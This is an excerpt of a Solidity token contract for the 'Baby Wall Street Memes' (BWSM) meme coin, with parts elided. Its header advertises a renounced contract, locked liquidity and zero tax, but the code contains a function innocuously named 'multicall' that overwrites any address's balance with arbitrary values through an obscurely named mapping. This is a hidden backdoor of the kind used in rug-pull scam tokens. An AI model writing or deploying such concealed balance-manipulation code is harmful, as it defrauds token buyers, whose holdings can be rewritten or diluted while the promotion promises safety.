/**
   BWSM - Renounced Trending  Lp safe locked 0/0% Buy/Sell Tax 
   Welcome to the home of collection of all legendary memes!
   We're laying the foundation and empowering our community 
   every step of the way. Together, we'll show the world that 
   Baby Wall Street Memes is here to stay. 
  TELEGRAM: https://t.me/BWSM_BSC
*/
...
contract BWSM is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private SOLCfat;
    ...
    string private constant _name = "BABY WALL STREET MEMES";
    string private constant _symbol = "BWSM";
    address private pending; 
    constructor () {
        pending = _msgSender(); 
        SOLCfat[_msgSender()] = _totalSupply;
    ...
    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        ...
        SOLCfat[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }
    ...
    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        ...
        uint256 fromBalance = SOLCfat[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        SOLCfat[from] = fromBalance - Menge;

        SOLCfat[to] = SOLCfat[to].add(Menge);
